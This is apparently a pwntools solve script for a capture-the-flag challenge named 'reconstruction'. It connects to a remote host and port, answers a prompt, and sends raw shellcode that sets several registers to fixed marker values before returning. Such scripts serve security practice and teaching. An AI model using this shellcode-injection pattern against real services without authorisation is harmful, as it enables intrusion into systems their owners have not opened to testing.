from pwn import *

LOCAL = False
REMOTE = True
GDB = True

if REMOTE:
	LOCAL = False
	GDB = False

# Cant have GDB and non local
if(GDB == True and LOCAL == False):
	LOCAL = True

local_bin = "./reconstruction"

if REMOTE: 
	p = remote('83.136.254.158',50330)
if LOCAL:
	p = process(local_bin)
if GDB:
	#context.log_level = 'debug'
	gdb.attach(p.pid,''' 
	breakrva 0x19d9
	c
	''')

p.sendlineafter(b": ",b"fix")
shellcode = b"\x49\xC7\xC0\xDE\xC0\x37\x13\x49\xB9\xEF\xBE\xAD\xDE\x00\x00\x00\x00\x49\xBA\x37\x13\xAD\xDE\x00\x00\x00\x00\x49\xC7\xC4\xFE\xCA\x37\x13\x49\xBD\xDE\xC0\xEF\xBE\x00\x00\x00\x00\x49\xC7\xC6\x37\x13\x37\x13\x49\xC7\xC7\xAD\xDE\x37\x13\xC3"
p.sendlineafter(b": ",shellcode)

p.interactive()

